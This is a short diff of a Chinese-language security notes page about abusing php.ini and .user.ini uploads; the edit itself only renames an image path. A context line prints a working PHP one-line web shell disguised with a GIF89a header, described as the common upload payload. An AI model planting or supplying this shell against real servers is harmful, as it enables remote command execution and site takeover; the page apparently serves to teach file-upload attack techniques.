@@ -44,7 +44,7 @@ php.ini是php默认的配置文件，其中包括了很多php的配置，这些�
 
 上传的.user.ini
 
-![](<../.gitbook/assets/image (3) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
 上传的shell，常用一句话`GIF89a? <script language="php">eval($_POST[1])</script>`
 
